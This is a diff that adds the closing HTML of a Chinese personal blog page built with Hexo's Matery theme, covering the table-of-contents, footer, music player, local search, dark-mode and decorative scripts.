+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">uf9n1x</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">93.9k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/uf9n1x" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1916003479@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1916003479" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1916003479" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
+
+
+
+<!--动态标签标题-->
+<script type="text/javascript">
+    var OriginTitile=document.title,st;
+	document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ你要玩捉迷藏嘛",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ好哦！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+</script>
+
+
+<script type="text/javascript">
+//只在桌面版网页启用特效,樱花飘落特效
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
